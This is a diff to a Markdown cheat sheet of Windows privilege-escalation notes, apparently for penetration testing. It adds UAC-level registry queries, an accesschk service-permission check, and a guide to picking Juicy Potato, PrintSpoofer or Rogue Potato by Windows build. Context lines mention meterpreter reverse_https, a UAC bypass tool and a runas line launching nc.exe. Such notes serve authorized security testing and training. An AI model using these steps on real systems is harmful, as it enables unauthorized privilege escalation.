@@ -84,6 +84,9 @@ windows/meterpreter/reverse_https
 
 
 * check UAC in cmd: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
+
+* find out UAC level: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
+
 * UAC can be bypassed using https://github.com/turbo/zero2hero
 OR 
 
@@ -252,7 +255,7 @@ Check rights of the user on service
 ```powershell
 # use accesschk
 
-PS C:\Temp> .\accesschk.exe /accepteula -ucqv user regsvc
+PS C:\Temp> .\accesschk.exe /accepteula -ucqv regsvc
 
 R  regsvc
 	SERVICE_QUERY_STATUS
@@ -616,6 +619,19 @@ C:\Windows\System32\runas.exe /savecred /user:<username> "c:\users\Public\nc.exe
 ```
 
 #### Token Impersonation
+
+Use potatoes wisely
+
+SeImpersonatePrivilege enabled?
+
+```text
+
+Find out the version based on build in here https://en.wikipedia.org/wiki/Windows_10_version_history
+
+Windows 7 – Windows 10 / Server 2016 version 1803 –> Juicy Potato
+Windows 10 / Server 2016 version 1607 – Windows 10 / Server 2019 present –> Print Spoofer
+Windows 10 / Server 2019 version 1809 – present –> Rogue Potato
+```
 
 * This shall tipically work if following privileges are available `SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`
 
